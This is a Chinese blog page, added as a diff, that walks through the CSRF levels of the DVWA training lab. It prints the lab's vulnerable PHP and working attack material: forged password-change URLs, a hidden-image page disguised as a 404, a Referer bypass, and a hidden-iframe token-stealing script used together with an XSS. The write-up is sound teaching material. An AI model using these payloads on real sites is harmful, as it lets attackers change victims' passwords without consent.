@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="zh-hans">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-16x16.png" />
+<link rel="manifest" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/site.webmanifest" />
+<link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/safari-pinned-tab.svg" color="#8aa2d3" />
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
+<meta name="theme-color" content="#ffffff" />
+
+
+<title>从DVWA看CSRF - Phoenix-Pl’s Blog</title>
+
+
+<meta name="author" content="DSRKafuU" />
+
+
+<meta name="description" content="A minimal Hugo theme with nice theme color." />
+
+
+<meta name="keywords" content="DVWA" />
+
+
+<meta property="og:title" content="从DVWA看CSRF" />
+<meta name="twitter:title" content="从DVWA看CSRF" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Phoenix-Pl.github.io/post/dvwacsrf/" /><meta property="og:description" content="CSRF是啥 CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在" />
+<meta name="twitter:description" content="CSRF是啥 CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" /><meta property="article:published_time" content="2020-05-11T00:00:00+00:00" /><meta property="article:modified_time" content="2020-05-11T00:00:00+00:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+<link rel="stylesheet" href="https://Phoenix-Pl.github.io/assets/css/fuji.min.css" />
+
+
+
+
+
+</head>
+
+<body data-theme="auto">
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://Phoenix-Pl.github.io/">Phoenix-Pl’s Blog</a>
+            
+            <span class="title-sub">书山有路勤为径，学海无涯苦作舟</span>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://Phoenix-Pl.github.io/post/dvwacsrf/">从DVWA看CSRF</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-11</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;3442 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/dvwa">DVWA</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <h2 id="csrf是啥">CSRF是啥</h2>
+<p>CSRF，全称Cross-site request  forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<h2 id="csrf攻击原理">CSRF攻击原理</h2>
+<ol>
+<li>
+<p>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p>
+</li>
+<li>
+<p>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p>
+</li>
+<li>
+<p>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</p>
+</li>
+<li>
+<p>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</p>
+</li>
+<li>
+<p>浏览器在接收到这些攻击性代码后，根据网站 B 的请求，在用户不知情的情况下携带 Cookie 信息，向网站 A 发出请求。网站 A 并不知道该请求其实是由 B 发起的，所以会根据用户 C 的 Cookie 信息以 C 的权限处理该请求，导致来自网站 B 的恶意代码被执行。</p>
+</li>
+</ol>
+<h2 id="与xss的区别">与XSS的区别</h2>
+<p>XSS是通过修改页面Javascript等代码后，发给用户从而实现盗取cookie信息，之后利用cookie进行登陆网站等操作。非法操作是黑客。
+CSRF并没有盗取cookie信息，而是通过用户直接利用cookie进行操作。非法操作并不是黑客，而是用户本身。</p>
+<h2 id="low">Low</h2>
+<pre><code class="language-php">if( isset( $_GET[ 'Change' ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $insert = &quot;UPDATE `users` SET password = '$pass_new' WHERE user = '&quot; . dvwaCurrentUser() . &quot;';&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt; 
+</code></pre>
+<p>可以看到，源码中的<code>mysql_real_escape_string() </code>函数有防护sql注入的作用，然后就只进行了<code>$pass_new == $pass_conf</code>判断，没有进行任何的验证。</p>
+<p><strong>漏洞利用</strong></p>
+<p>构造链接</p>
+<p>1、最基础的</p>
+<p><code>http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code></p>
+<p>受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210226213258991.png" alt="在这里插入图片描述" />
+</p>
+<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210226213403111.png" alt="在这里插入图片描述" />
+</p>
+<p>有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。</p>
+<p>2、我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：</p>
+<p>如 <code>http://dwz-9.cn/1I4tu</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2021022621391587.png" alt="在这里插入图片描述" />
+</p>
+<p>需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210226214000770.png" alt="在这里插入图片描述" />
+</p>
+<p>3、构造攻击页面</p>
+<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示，就在本地写一个test.html，下面是具体代码。</p>
+<pre><code class="language-php">&lt;img src=&quot;http://localhost/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;
+
+&lt;h1&gt;404&lt;h1&gt;
+
+&lt;h2&gt;file not found.&lt;h2&gt;
+</code></pre>
+<p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。</p>
+<h2 id="medium">Medium</h2>
+<pre><code class="language-php">&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+
+echo &quot;\$_SERVER[ 'HTTP_REFERER' ] is &quot;.$_SERVER[ 'HTTP_REFERER' ];
+
+echo &quot;\$_SERVER[ 'SERVER_NAME' ] is &quot;.$_SERVER[ 'SERVER_NAME' ];
+
+echo stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]);
+
+// 自己添加的打印语句，用来查看变量的值
+
+// Checks to see where the request came from
+
+//如果可以在HTTP头部的Referer字段中找到Host字段的内容，说明来自可信的源
+
+if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
+
+// Get input
+
+$pass_new = $_GET[ 'password_new' ];
+
+$pass_conf = $_GET[ 'password_conf' ];
+
+
+
+// Do the passwords match?
+
+if( $pass_new == $pass_conf ) {
+
+// They do!
+
+$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+$pass_new = md5( $pass_new );
+
+
+
+// Update the database，重置当前用户的密码
+
+$insert = &quot;UPDATE `users` SET password = '$pass_new' WHERE user = '&quot; . dvwaCurrentUser() . &quot;';&quot;;
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+// Feedback for the user
+
+$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+
+}
+
+else {
+
+// Issue with passwords matching
+
+$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+
+}
+
+}
+
+//如果不能在HTTP头部的Referer字段中找到Host字段的内容，说明来自可信的不可信源，提示用户，请求似乎看起来不正确
+
+else {
+
+// Didn't come from a trusted source
+
+$html .= &quot;&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;&quot;;
+
+}
+
+</code></pre>
+<p>相关函数说明</p>
+<p>int eregi(string pattern, string string)</p>
+<p>检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。</p>
+<p><code>Stripos()</code>函数查找字符串在另一个字符串中第一次出现的位置（不区分大小写）。</p>
+<p><code>stripos(string,find,start)</code></p>
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td>必需。规定被搜索的字符串。</td>
+</tr>
+<tr>
+<td>find</td>
+<td>必需。规定要查找的字符。</td>
+</tr>
+<tr>
+<td>start</td>
+<td>可选。规定开始搜索的位置。</td>
+</tr>
+</tbody>
+</table>
+<p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是localhost），希望通过这种机制抵御CSRF攻击。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210226232303577.png" alt="在这里插入图片描述" />
+</p>
+<p>PS：这里因为没有服务器，引用freebuf一位大佬博客</p>
+<p><strong>漏洞利用</strong></p>
+<p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）</p>
+<p>我们可以将攻击页面命名为192.168.153.130.html（页面被放置在攻击者的服务器里，这里是10.4.253.2）就可以绕过了</p>
+<p><img class="img-zoomable" src="https://image.3001.net/images/20161031/14778956078386.png!small" alt="" />
+</p>
+<p>Referer参数完美绕过过滤规则</p>
+<p><img class="img-zoomable" src="https://image.3001.net/images/20161031/14778956835405.png!small" alt="" />
+</p>
+<p>密码修改成功</p>
+<p><img class="img-zoomable" src="https://image.3001.net/images/20161031/14778957125554.png!small" alt="" />
+</p>
+<h2 id="high">High</h2>
+<pre><code class="language-php">&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $insert = &quot;UPDATE `users` SET password = '$pass_new' WHERE user = '&quot; . dvwaCurrentUser() . &quot;';&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt; 
+</code></pre>
+<p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
+<p><strong>漏洞利用</strong></p>
+<p>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
+<p>试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</p>
+<pre><code class="language-php">&lt;script type=&quot;text/javascript&quot;&gt;
+
+    function attack()
+
+  {
+
+   document.getElementsByName('user_token')[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName('user_token')[0].value;
+
+  document.getElementById(&quot;transfer&quot;).submit(); 
+
+  }
+
+&lt;/script&gt;
+
+ 
+
+&lt;iframe src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;
+
+&lt;/iframe&gt;
+
+ 
+
+&lt;body onload=&quot;attack()&quot;&gt;
+
+  &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;&gt;
+
+   &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;
+
+    &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;
+
+   &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;
+
+  &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;
+
+   &lt;/form&gt;
+
+&lt;/body&gt;
+</code></pre>
+<p>攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。</p>
+<p>然而理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是http://192.168.153.130/dvwa/vulnerabilities/csrf，位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。</p>
+<p>由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.153.130中，才有可能完成攻击。下面利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token）。</p>
+<p><img class="img-zoomable" src="https://image.3001.net/images/20161031/14778957473585.png!small" alt="" />
+</p>
+<p>这里的Name存在XSS漏洞，于是抓包，改参数，成功弹出token</p>
+<p><img class="img-zoomable" src="https://image.3001.net/images/20161031/1477895775866.png!small" alt="" />
+</p>
+<p>注入代码如下</p>
+<p><img class="img-zoomable" src="https://image.3001.net/images/20161031/14778958053271.png!small" alt="" />
+</p>
+<h2 id="impossible"><strong>Impossible</strong></h2>
+<pre><code class="language-php"> &lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $pass_curr = $_GET[ 'password_current' ];
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+
+    // Sanitise current password input
+    $pass_curr = stripslashes( $pass_curr );
+    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass_curr = md5( $pass_curr );
+
+    // Check that the current password is correct
+    $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+    $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );
+    $data-&gt;execute();
+
+    // Do both new passwords match and does the current password match the user?
+    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
+        // It does!
+        $pass_new = stripslashes( $pass_new );
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update database with new password
+        $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
+        $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );
+        $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+        $data-&gt;execute();
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+
+</code></pre>
+<p>可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p>
+
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>除特殊注明部分，本站内容采用 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a> 进行许可。</p>
+    </blockquote>
+</div>
+
+
+
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/Phoenix-Pl" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/dvwa/">DVWA</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3><nav id="TableOfContents">
+  <ul>
+    <li><a href="#csrf是啥">CSRF是啥</a></li>
+    <li><a href="#csrf攻击原理">CSRF攻击原理</a></li>
+    <li><a href="#与xss的区别">与XSS的区别</a></li>
+    <li><a href="#low">Low</a></li>
+    <li><a href="#medium">Medium</a></li>
+    <li><a href="#high">High</a></li>
+    <li><a href="#impossible"><strong>Impossible</strong></a></li>
+  </ul>
+</nav></div>
+</aside>
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
+</div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/Phoenix-Pl" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/dvwa/">DVWA</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#csrf是啥">CSRF是啥</a></li>
+    <li><a href="#csrf攻击原理">CSRF攻击原理</a></li>
+    <li><a href="#与xss的区别">与XSS的区别</a></li>
+    <li><a href="#low">Low</a></li>
+    <li><a href="#medium">Medium</a></li>
+    <li><a href="#high">High</a></li>
+    <li><a href="#impossible"><strong>Impossible</strong></a></li>
+  </ul>
+</nav>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2020-2021
+                <a href="https://Phoenix-Pl.github.io/">DSRKafuU</a>
+                 | <a href="https://github.com/itsme/my_blog">Source code</a> 
+                | 基于 <a href="https://github.com/amzrk2/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 构建
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="/assets/js/fuji.min.js"></script>
+
+
+</body>
+
+</html>
